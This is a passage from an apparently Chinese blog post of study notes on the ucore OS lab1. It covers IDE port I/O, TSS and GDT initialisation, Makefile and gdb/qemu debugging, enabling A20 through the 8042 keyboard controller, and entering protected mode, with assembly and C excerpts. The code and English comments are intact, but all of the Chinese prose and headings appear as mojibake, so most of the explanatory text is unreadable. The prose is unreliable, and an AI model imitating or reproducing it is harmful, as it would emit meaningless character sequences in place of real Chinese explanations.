%ds<br><br>    # get rid of the trap number and error code<br>    addl $0x8, %esp<br>    iret<br></code></pre></div></td></tr></table></figure><h3 id="5-åœ°å€ç©ºé—´"><a href="#5-åœ°å€ç©ºé—´" class="headerlink" title="5.åœ°å€ç©ºé—´"></a>5.åœ°å€ç©ºé—´</h3><pre><code class=" mermaid">flowchart LR    é€»è¾‘åœ°å€æˆ–è™šæ‹Ÿåœ°å€--&gt;|åˆ†æ®µåœ°å€è½¬æ¢|çº¿æ€§åœ°å€    çº¿æ€§åœ°å€--&gt;|åˆ†é¡µåœ°å€è½¬æ¢|ç‰©ç†åœ°å€    çº¿æ€§åœ°å€--&gt;End</code></pre><h3 id="6-ç¡¬ä»¶è®¿é—®"><a href="#6-ç¡¬ä»¶è®¿é—®" class="headerlink" title="6.ç¡¬ä»¶è®¿é—®"></a>6.<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_3_2_3_dist_accessing.html">ç¡¬ä»¶è®¿é—®</a></h3><p>bootloaderè®©CPUè¿›å…¥ä¿æŠ¤æ¨¡å¼åï¼Œä¸‹ä¸€æ­¥çš„å·¥ä½œå°±æ˜¯ä»ç¡¬ç›˜ä¸ŠåŠ è½½å¹¶è¿è¡ŒOSã€‚è€ƒè™‘åˆ°å®ç°çš„ç®€å•æ€§ï¼Œbootloaderçš„è®¿é—®ç¡¬ç›˜éƒ½æ˜¯LBAæ¨¡å¼çš„PIOï¼ˆProgram IOï¼‰æ–¹å¼ï¼Œå³æ‰€æœ‰çš„IOæ“ä½œæ˜¯é€šè¿‡CPUè®¿é—®ç¡¬ç›˜çš„IOåœ°å€å¯„å­˜å™¨å®Œæˆã€‚</p><p>ä¸€èˆ¬ä¸»æ¿æœ‰2ä¸ªIDEé€šé“ï¼Œæ¯ä¸ªé€šé“å¯ä»¥æ¥2ä¸ªIDEç¡¬ç›˜ã€‚è®¿é—®ç¬¬ä¸€ä¸ªç¡¬ç›˜çš„æ‰‡åŒºå¯è®¾ç½®IOåœ°å€å¯„å­˜å™¨0x1f0-0x1f7å®ç°çš„ï¼Œå…·ä½“å‚æ•°è§ä¸‹è¡¨ã€‚ä¸€èˆ¬ç¬¬ä¸€ä¸ªIDEé€šé“é€šè¿‡è®¿é—®IOåœ°å€0x1f0-0x1f7æ¥å®ç°ï¼Œç¬¬äºŒä¸ªIDEé€šé“é€šè¿‡è®¿é—®0x170-0x17få®ç°ã€‚æ¯ä¸ªé€šé“çš„ä¸»ä»ç›˜çš„é€‰æ‹©é€šè¿‡ç¬¬6ä¸ªIOåç§»åœ°å€å¯„å­˜å™¨æ¥è®¾ç½®ã€‚</p><p>è¡¨ä¸€ ç£ç›˜IOåœ°å€å’Œå¯¹åº”åŠŸèƒ½</p><p>ç¬¬6ä½ï¼šä¸º1=LBAæ¨¡å¼ï¼›0 = CHSæ¨¡å¼ ç¬¬7ä½å’Œç¬¬5ä½å¿…é¡»ä¸º1</p><table><thead><tr><th>IOåœ°å€</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>0x1f0</td><td>è¯»æ•°æ®ï¼Œå½“0x1f7ä¸ä¸ºå¿™çŠ¶æ€æ—¶ï¼Œå¯ä»¥è¯»ã€‚</td></tr><tr><td>0x1f2</td><td>è¦è¯»å†™çš„æ‰‡åŒºæ•°ï¼Œæ¯æ¬¡è¯»å†™å‰ï¼Œä½ éœ€è¦è¡¨æ˜ä½ è¦è¯»å†™å‡ ä¸ªæ‰‡åŒºã€‚æœ€å°æ˜¯1ä¸ªæ‰‡åŒº</td></tr><tr><td>0x1f3</td><td>å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„0-7ä½</td></tr><tr><td>0x1f4</td><td>å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„8-15ä½</td></tr><tr><td>0x1f5</td><td>å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„16-23ä½</td></tr><tr><td>0x1f6</td><td>ç¬¬0~3ä½ï¼šå¦‚æœæ˜¯LBAæ¨¡å¼å°±æ˜¯24-27ä½ ç¬¬4ä½ï¼šä¸º0ä¸»ç›˜ï¼›ä¸º1ä»ç›˜</td></tr><tr><td>0x1f7</td><td>çŠ¶æ€å’Œå‘½ä»¤å¯„å­˜å™¨ã€‚æ“ä½œæ—¶å…ˆç»™å‘½ä»¤ï¼Œå†è¯»å–ï¼Œå¦‚æœä¸æ˜¯å¿™çŠ¶æ€å°±ä»0x1f0ç«¯å£è¯»æ•°æ®</td></tr></tbody></table><p>å½“å‰ ç¡¬ç›˜æ•°æ®æ˜¯å‚¨å­˜åˆ°ç¡¬ç›˜æ‰‡åŒºä¸­ï¼Œä¸€ä¸ªæ‰‡åŒºå¤§å°ä¸º512å­—èŠ‚ã€‚è¯»ä¸€ä¸ªæ‰‡åŒºçš„æµç¨‹ï¼ˆå¯å‚çœ‹boot/bootmain.cä¸­çš„readsectå‡½æ•°å®ç°ï¼‰å¤§è‡´å¦‚ä¸‹ï¼š</p><ol><li>ç­‰å¾…ç£ç›˜å‡†å¤‡å¥½</li><li>å‘å‡ºè¯»å–æ‰‡åŒºçš„å‘½ä»¤</li><li>ç­‰å¾…ç£ç›˜å‡†å¤‡å¥½</li><li>æŠŠç£ç›˜æ‰‡åŒºæ•°æ®è¯»åˆ°æŒ‡å®šå†…å­˜</li></ol><h3 id="é™„-TSS"><a href="#é™„-TSS" class="headerlink" title="é™„: TSS"></a>é™„: TSS</h3><p>åœ¨<code>kern_init()-&gt;pmm_init()-&gt;gdt_init()</code>ä¸­åˆå§‹åŒ–, TSSä¸­çš„å†…æ ¸æ ˆåœ°å€å°±åœ¨è¿™é‡Œè®¾ç½®</p><p>TSSå¯ä»¥åœ¨å†…å­˜çš„ä»»æ„ä½ç½®, è€Œucoreçš„taskstateå®šä¹‰åœ¨pmm.cä¸­, é€šè¿‡æ„é€ <em>é—¨æè¿°ç¬¦</em> , å¼„åˆ°<code>struct segdesc gdt[]</code>é‡Œé¢,<br>ç„¶åä½¿ç”¨lgdtæŒ‡ä»¤åŠ è½½åˆ°GDTä¸­, <strong>å†…æ ¸æ ˆ(8KB)ä»<code>c0120000 bootstack</code>åˆ°<code>c0122000 bootstacktop</code></strong>, åœ¨entry.Sä¸­æ‰¾åˆ°çš„, kernel.symå¯çœ‹åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...è¯¦è§Lab2<br><span class="hljs-comment">// Since we are using bootloader&#x27;s GDT,</span><br>  <span class="hljs-comment">// we should reload gdt (second time, the last time) to get user segments and the TSS</span><br>  <span class="hljs-comment">// map virtual_addr 0 ~ 4G = linear_addr 0 ~ 4G</span><br>  <span class="hljs-comment">// then set kernel stack (ss:esp) in TSS, setup TSS in gdt, load TSS</span><br>  gdt_init();<br>  ...<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEG_TSS     5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GD_TSS      ((SEG_TSS) &lt;&lt; 3)        <span class="hljs-comment">// task segment selector</span></span><br><span class="hljs-comment">/* gdt_init - initialize the default GDT and TSS */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">gdt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// set boot kernel stack and default SS0</span><br>    load_esp0((<span class="hljs-keyword">uintptr_t</span>)bootstacktop);<br>    ts.ts_ss0 = KERNEL_DS;<br><br>    <span class="hljs-comment">// initialize the TSS filed of the gdt</span><br>    gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="hljs-keyword">uintptr_t</span>)&amp;ts, <span class="hljs-keyword">sizeof</span>(ts), DPL_KERNEL);<br><br>    <span class="hljs-comment">// reload all segment registers</span><br>    lgdt(&amp;gdt_pd);<br><br>    <span class="hljs-comment">// load the TSS</span><br>    ltr(GD_TSS);<br>&#125;<br></code></pre></div></td></tr></table></figure><img src="../../image/ucore/image-20211221160818556.png" alt="image-20211221160818556" style="zoom: 67%;" /><img src="../../image/ucore/image-20211221161024855.png" alt="image-20211221161024855" style="zoom:67%;" /><h3 id="é™„2-make"><a href="#é™„2-make" class="headerlink" title="é™„2: make"></a>é™„2: make</h3><p><a href="https://www.gnu.org/software/make/manual/make.html#Special-Targets">Special Built-in Target Names</a> | <a href="https://www.gnu.org/software/make/manual/make.html#Automatic-Variables-1">Automatic Variables</a> | <a href="https://www.gnu.org/software/make/manual/make.html#Functions">Functions</a> | <a href="https://www.gnu.org/software/make/manual/make.html#Implicit-Rules">Using Implicit Rules</a>&amp;<a href="https://www.gnu.org/software/make/manual/make.html#Catalogue-of-Rules">Catalogue-of-Rules</a> | </p><ul><li>$(foreach var,list,text):  <code>foreach(var: list)</code> </li><li>$(if condition,then-part[,else-part])</li><li>$(filter patternâ€¦,text)</li><li>$(basename namesâ€¦)</li><li>The eval Function</li><li>å«æœ‰<code>$(1)</code>è¿™ä¸ªçš„call functionå°±ä¸æ˜¯æœ€é«˜ä¸€çº§çš„call</li><li><code>make --trace 2&gt;/dev/null</code> </li><li><code>=</code> vs. <code>:=</code> </li></ul><h2 id="å‡ ä¸ªç»ƒä¹ "><a href="#å‡ ä¸ªç»ƒä¹ " class="headerlink" title="å‡ ä¸ªç»ƒä¹ "></a>å‡ ä¸ªç»ƒä¹ </h2><h3 id="é¡¹ç›®ç»„æˆ"><a href="#é¡¹ç›®ç»„æˆ" class="headerlink" title="é¡¹ç›®ç»„æˆ"></a><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_2_2_files.html">é¡¹ç›®ç»„æˆ</a></h3><h3 id="ç»ƒä¹ ä¸€"><a href="#ç»ƒä¹ ä¸€" class="headerlink" title="ç»ƒä¹ ä¸€"></a>ç»ƒä¹ ä¸€</h3><blockquote><p>ç†è§£é€šè¿‡<a href="https://www.gnu.org/software/make/manual/make.html">make</a>ç”Ÿæˆæ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹</p></blockquote><ul><li><p>æ“ä½œç³»ç»Ÿé•œåƒæ–‡ä»¶ucore.imgæ˜¯å¦‚ä½•ä¸€æ­¥ä¸€æ­¥ç”Ÿæˆçš„ï¼Ÿ(éœ€è¦æ¯”è¾ƒè¯¦ç»†åœ°è§£é‡ŠMakefileä¸­æ¯ä¸€æ¡ç›¸å…³å‘½ä»¤å’Œå‘½ä»¤å‚æ•°çš„å«ä¹‰ï¼Œä»¥åŠè¯´æ˜å‘½ä»¤å¯¼è‡´çš„ç»“æœ)</p><ul><li>MakefileæŒæ¡ä¸å¤Ÿçš„è¯æ ¹æœ¬çœ‹ä¸æ‡‚åœ¨å†™ä»€ä¹ˆ</li></ul></li><li><p>ä¸€ä¸ªè¢«ç³»ç»Ÿè®¤ä¸ºæ˜¯ç¬¦åˆè§„èŒƒçš„ç¡¬ç›˜ä¸»å¼•å¯¼æ‰‡åŒºçš„ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Ÿ</p><ul><li>æœ€åä¸¤ä¸ªå­—èŠ‚æ˜¯0x55,0xAA</li></ul></li><li><p>åé¢åˆå¼€äº†ä¸€ç¯‡åšå®¢: <a href="./ucore_makefile.md">link</a> </p></li></ul><h3 id="ç»ƒä¹ äºŒ"><a href="#ç»ƒä¹ äºŒ" class="headerlink" title="ç»ƒä¹ äºŒ"></a>ç»ƒä¹ äºŒ</h3><blockquote><p>ä½¿ç”¨qemuæ‰§è¡Œå¹¶è°ƒè¯•lab1ä¸­çš„è½¯ä»¶</p></blockquote><ol><li><p>ä»CPUåŠ ç”µåæ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤å¼€å§‹ï¼Œå•æ­¥è·Ÿè¸ªBIOSçš„æ‰§è¡Œã€‚</p><ul><li>ç›´æ¥å°†gdbè¿æ¥åˆ°qemu, æ–­ç‚¹ä¹Ÿä¸ç”¨ä¸‹ç›´æ¥åœåœ¨ç¬¬ä¸€æ¡æŒ‡ä»¤ä¸Š</li><li>è¦æ³¨æ„çš„æ˜¯æ­¤æ—¶<code>$pc($eip)</code>ä¸æ˜¯çœŸå®çš„åœ°å€, <code>(($cs&lt;&lt;4)+$eip)</code>æ‰æ˜¯</li></ul></li><li><p>åœ¨åˆå§‹åŒ–ä½ç½®0x7c00è®¾ç½®å®åœ°å€æ–­ç‚¹,æµ‹è¯•æ–­ç‚¹æ­£å¸¸ã€‚</p><ul><li>æ­¤æ—¶åœ¨bootloaderä¸­, è®¾ç½®ä¸º<code>file obj/bootblock.o</code>å’Œ<code>b *0x7c00</code>å³å¯(åˆ«å¿˜äº†<code>continue</code>è¦ä¸ç„¶å°±æ˜¯ç¬¬ä¸€ä¸ªé—®é¢˜äº†)</li></ul></li><li><p>ä»0x7c00å¼€å§‹è·Ÿè¸ªä»£ç è¿è¡Œ,å°†å•æ­¥è·Ÿè¸ªåæ±‡ç¼–å¾—åˆ°çš„ä»£ç ä¸bootasm.Så’Œ bootblock.asmè¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment">#æ”¹å†™Makefileæ–‡ä»¶</span><br><span class="hljs-section">debug: <span class="hljs-variable">$(UCOREIMG)</span></span><br>    <span class="hljs-variable">$(V)</span><span class="hljs-variable">$(TERMINAL)</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$(QEMU)</span> -S -s -d in_asm -D <span class="hljs-variable">$(BINDIR)</span>/q.log -parallel stdio -hda <span class="hljs-variable">$&lt;</span> -serial null&quot;</span><br>    <span class="hljs-variable">$(V)</span>sleep 2<br>    <span class="hljs-variable">$(V)</span><span class="hljs-variable">$(TERMINAL)</span> -e <span class="hljs-string">&quot;gdb -q -tui -x tools/gdbinit&quot;</span><br></code></pre></div></td></tr></table></figure><p>åœ¨è°ƒç”¨qemuæ—¶å¢åŠ <code>-d in_asm -D q.log</code>å‚æ•°ï¼Œä¾¿å¯ä»¥å°†è¿è¡Œçš„æ±‡ç¼–æŒ‡ä»¤ä¿å­˜åœ¨q.logä¸­ã€‚</p></li></ol><h3 id="ç»ƒä¹ ä¸‰"><a href="#ç»ƒä¹ ä¸‰" class="headerlink" title="ç»ƒä¹ ä¸‰"></a>ç»ƒä¹ ä¸‰</h3><blockquote><p>åˆ†æbootloaderè¿›å…¥ä¿æŠ¤æ¨¡å¼çš„è¿‡ç¨‹.</p></blockquote><ul><li><p>ä¸ºä½•å¼€å¯A20ï¼Œä»¥åŠå¦‚ä½•å¼€å¯A20</p><ul><li><p>Intelæ—©æœŸçš„8086 CPUæä¾›äº†20æ ¹åœ°å€çº¿ï¼Œä½†å¯„å­˜å™¨åªæœ‰16ä½ï¼Œæ‰€ä»¥ä½¿ç”¨<strong>æ®µå¯„å­˜å™¨å€¼ &lt;&lt; 4 + æ®µå†…åç§»å€¼</strong>çš„æ–¹æ³•æ¥è®¿é—®åˆ°æ‰€æœ‰å†…å­˜ï¼Œä½†æŒ‰è¿™ç§æ–¹å¼æ¥è®¡ç®—å‡ºçš„åœ°å€çš„æœ€å¤§å€¼ä¸º1088KBï¼Œè¶…è¿‡20æ ¹åœ°å€çº¿æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œä¼šå‘ç”Ÿâ€œå›å·â€ï¼ˆå’Œæ•´æ•°æº¢å‡ºæœ‰ç‚¹ç±»ä¼¼ï¼‰ã€‚ä½†ä¸‹ä¸€ä»£çš„åŸºäºIntel 80286 CPUçš„è®¡ç®—æœºç³»ç»Ÿæä¾›äº†24æ ¹åœ°å€çº¿ï¼Œå½“CPUè®¡ç®—å‡ºçš„åœ°å€è¶…è¿‡1MBæ—¶ä¾¿<strong>ä¸ä¼šå‘ç”Ÿå›å·</strong>ï¼Œè€Œè¿™å°±é€ æˆäº†<strong>å‘ä¸‹ä¸å…¼å®¹</strong>ã€‚ä¸ºäº†ä¿æŒå®Œå…¨çš„å‘ä¸‹å…¼å®¹æ€§ï¼ŒIBMåœ¨è®¡ç®—æœºç³»ç»Ÿä¸ŠåŠ ä¸ªç¡¬ä»¶é€»è¾‘æ¥æ¨¡ä»¿æ—©æœŸçš„å›ç»•ç‰¹å¾ï¼Œè€Œè¿™å°±æ˜¯<strong>A20 Gate</strong>ã€‚</p></li><li><p>A20 Gateçš„æ–¹æ³•æ˜¯æŠŠA20åœ°å€çº¿æ§åˆ¶å’Œé”®ç›˜æ§åˆ¶å™¨çš„ä¸€ä¸ªè¾“å‡ºè¿›è¡ŒANDæ“ä½œï¼Œè¿™æ ·æ¥æ§åˆ¶A20åœ°å€çº¿çš„æ‰“å¼€ï¼ˆä½¿èƒ½ï¼‰å’Œå…³é—­ï¼ˆå±è”½\ç¦æ­¢ï¼‰ã€‚ä¸€å¼€å§‹æ—¶A20åœ°å€çº¿æ§åˆ¶æ˜¯è¢«å±è”½çš„ï¼ˆæ€»ä¸º0ï¼‰ï¼Œç›´åˆ°ç³»ç»Ÿè½¯ä»¶é€šè¿‡ä¸€å®šçš„IOæ“ä½œå»æ‰“å¼€å®ƒã€‚å½“A20 åœ°å€çº¿æ§åˆ¶ç¦æ­¢æ—¶ï¼Œåˆ™ç¨‹åºå°±åƒåœ¨8086ä¸­è¿è¡Œï¼Œ1MBä»¥ä¸Šçš„åœ°å€ä¸å¯è®¿é—®ï¼›ä¿æŠ¤æ¨¡å¼ä¸‹A20åœ°å€çº¿æ§åˆ¶å¿…é¡»æ‰“å¼€ã€‚A20æ§åˆ¶æ‰“å¼€åï¼Œå†…å­˜å¯»å€å°†ä¸ä¼šå‘ç”Ÿå›å·ã€‚</p></li><li><p>åœ¨å½“å‰ç¯å¢ƒä¸­ï¼Œæ‰€ç”¨åˆ°çš„é”®ç›˜æ§åˆ¶å™¨8042çš„IOç«¯å£åªæœ‰0x60å’Œ0x64ä¸¤ä¸ªç«¯å£ã€‚8042é€šè¿‡è¿™äº›ç«¯å£ç»™é”®ç›˜æ§åˆ¶å™¨æˆ–é”®ç›˜å‘é€å‘½ä»¤æˆ–è¯»å–çŠ¶æ€ã€‚è¾“å‡ºç«¯å£P2ç”¨äºç‰¹å®šç›®çš„ã€‚ä½0ï¼ˆP20å¼•è„šï¼‰ç”¨äºå®ç°CPUå¤ä½æ“ä½œï¼Œä½1ï¼ˆP21å¼•è„šï¼‰ç”¨äºæ§åˆ¶A20ä¿¡å·çº¿çš„å¼€å¯ä¸å¦ã€‚</p></li><li><p>æœ‰å…³æ¦‚å¿µ:</p><p>8042æœ‰4ä¸ªå¯„å­˜å™¨ï¼š</p><ul><li>1ä¸ª8-bité•¿çš„Input bufferï¼›Write-Onlyï¼›</li><li>1ä¸ª8-bité•¿çš„Output bufferï¼› Read-Onlyï¼›</li><li>1ä¸ª8-bité•¿çš„Status Registerï¼›Read-Onlyï¼›</li><li>1ä¸ª8-bité•¿çš„Control Registerï¼›Read/Writeã€‚</li></ul><p>æœ‰ä¸¤ä¸ªç«¯å£åœ°å€ï¼š60hå’Œ64hï¼Œæœ‰å…³å¯¹å®ƒä»¬çš„è¯»å†™æ“ä½œæè¿°å¦‚ä¸‹ï¼š</p><ul><li>è¯»60hç«¯å£ï¼Œè¯»output buffer</li><li>å†™60hç«¯å£ï¼Œå†™input buffer</li><li>è¯»64hç«¯å£ï¼Œè¯»Status Register</li><li>æ“ä½œControl Registerï¼Œé¦–å…ˆè¦å‘64hç«¯å£å†™ä¸€ä¸ªå‘½ä»¤ï¼ˆ20hä¸ºè¯»å‘½ä»¤ï¼Œ60hä¸ºå†™å‘½ä»¤ï¼‰ï¼Œç„¶åæ ¹æ®å‘½ä»¤ä»60hç«¯å£è¯»å‡ºControl Registerçš„æ•°æ®æˆ–è€…å‘60hç«¯å£å†™å…¥Control Registerçš„æ•°æ®ï¼ˆ64hç«¯å£è¿˜å¯ä»¥æ¥å—è®¸å¤šå…¶å®ƒçš„å‘½ä»¤ï¼‰ã€‚<br>å¦‚æœè¦<strong>å†™output</strong>, åˆ™å‘64hå†™å…¥å‘½ä»¤0d1h, å‘input bufå†™å…¥control registerä¸­å‘½ä»¤çš„å‚æ•°</li></ul><p>Status Registerçš„å®šä¹‰ï¼ˆè¦ç”¨bit 0å’Œbit 1ï¼‰ï¼š</p><table><thead><tr><th>bit</th><th>meaning</th></tr></thead><tbody><tr><td>0</td><td>output register (60h) ä¸­æœ‰æ•°æ®</td></tr><tr><td><strong>1</strong></td><td><strong>input register (60h/64h) æœ‰æ•°æ®</strong></td></tr><tr><td>2</td><td>ç³»ç»Ÿæ ‡å¿—ï¼ˆä¸Šç”µå¤ä½åè¢«ç½®ä¸º0ï¼‰</td></tr><tr><td>3</td><td>data in input register is command (1) or data (0)</td></tr><tr><td>4-7</td><td>(Nothing special)</td></tr></tbody></table></li></ul></li></ul><p><img src="https://i.loli.net/2021/11/15/o2X7OPRbzxvVeUS.png" alt="img"></p><ul><li><p>ä»£ç ä¸­çš„æµç¨‹:</p><p><strong>è¯»0x64ç«¯å£(è¯»Status Register), ç­‰å¾…ç¬¬äºŒä½(æ ‡å¿—input bufferæ˜¯å¦ä¸ºç©º)ç­‰äº0<br>å‘64hå‘é€0d1hå‘½ä»¤(ä½œç”¨æ˜¯å†™output port,å³ä¸€ä¸ªé”®ç›˜æ§åˆ¶å™¨å‘½ä»¤),<br>ç„¶åç­‰å¾…input bufä¸ºç©ºæ—¶å‘0x60hå†™å…¥control registerçš„å‚æ•°(å³è¦è¾“å‡ºåœ¨output portä¸Šçš„å€¼)</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">    # Enable A20:<br>    #  For backwards compatibility with the earliest PCs, physical<br>    #  address line 20 is tied low, so that addresses higher than<br>    #  1MB wrap around to zero by default. This code undoes this.<br>seta20.1:<br>    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).<br>    testb $0x2, %al<br>    jnz seta20.1<br><br>    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64<br>    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#x27;s P2 port<br><br>seta20.2:<br>    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).<br>    testb $0x2, %al<br>    jnz seta20.2<br><br>    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60<br>    outb %al, $0x60                                 # 0xdf = 11011111, means set P2&#x27;s A20 bit(the 1 bit) to 1<br></code></pre></div></td></tr></table></figure><ul><li>å¦‚ä½•åˆå§‹åŒ–GDTè¡¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lgdt gdtdesc<br># Bootstrap GDT<br>.p2align 2                                          # force 4 byte alignment<br>gdt:<br>    SEG_NULLASM                                     # null seg<br>    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel<br>    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel<br><br>gdtdesc:<br>    .word 0x17                                      # sizeof(gdt) - 1<br>    .long gdt                                       # address gdt<br>    <br># asm.h<br>#define STA_X       0x8     // Executable segment<br>#define STA_W       0x2     // Writeable (non-executable segments)<br>#define STA_R       0x2     // Readable (executable segments)<br></code></pre></div></td></tr></table></figure><ul><li>è¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼šé€šè¿‡å°†cr0å¯„å­˜å™¨PEä½ç½®1ä¾¿å¼€å¯äº†ä¿æŠ¤æ¨¡å¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">movl %cr0, %eax<br>orl $CR0_PE_ON, %eax<br>movl %eax, %cr0<br></code></pre></div></td></tr></table></figure><ul><li>é€šè¿‡é•¿è·³è½¬æ›´æ–°csçš„åŸºåœ°å€</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ljmp $PROT_MODE_CSEG, $protcseg<br>.code32<br>protcseg:<br></code></pre></div></td></tr></table></figure><ul><li>è®¾ç½®æ®µå¯„å­˜å™¨ï¼Œå¹¶å»ºç«‹å †æ ˆ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">movw $PROT_MODE_DSEG, %ax<br>movw %ax, %ds<br>movw %ax, %es<br>movw %ax, %fs<br>movw %ax, %gs<br>movw %ax, %ss<br>movl $0x0, %ebp<br>movl $start, %esp<br></code></pre></div></td></tr></table></figure><ul><li>è½¬åˆ°ä¿æŠ¤æ¨¡å¼å®Œæˆï¼Œè¿›å…¥bootä¸»æ–¹æ³•</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">call bootmain<br></code></pre></div></td></tr></table></figure><h3 id="ç»ƒä¹ å››"><a href="#ç»ƒä¹ å››" class="headerlink" title="ç»ƒä¹ å››"></a>ç»ƒä¹ å››</h3><blockquote><p>åˆ†æbootloaderåŠ è½½ELFæ ¼å¼çš„OSçš„è¿‡ç¨‹ã€‚</p></blockquote><ul><li>IDE: Integrated Drive Electronicsï¼Œå®ƒçš„æœ¬æ„æ˜¯æŒ‡æŠŠæ§åˆ¶å™¨ä¸ç›˜ä½“é›†æˆåœ¨ä¸€èµ·çš„ç¡¬ç›˜é©±åŠ¨å™¨ï¼ŒIDEæ˜¯è¡¨ç¤ºç¡¬ç›˜çš„ä¼ è¾“æ¥å£ã€‚</li></ul><p>bootloaderè®©CPUè¿›å…¥ä¿æŠ¤æ¨¡å¼åï¼Œä¸‹ä¸€æ­¥çš„å·¥ä½œå°±æ˜¯ä»ç¡¬ç›˜ä¸ŠåŠ è½½å¹¶è¿è¡ŒOSã€‚è€ƒè™‘åˆ°å®ç°çš„ç®€å•æ€§ï¼Œbootloaderçš„è®¿é—®ç¡¬ç›˜éƒ½æ˜¯LBAæ¨¡å¼çš„PIOï¼ˆProgram 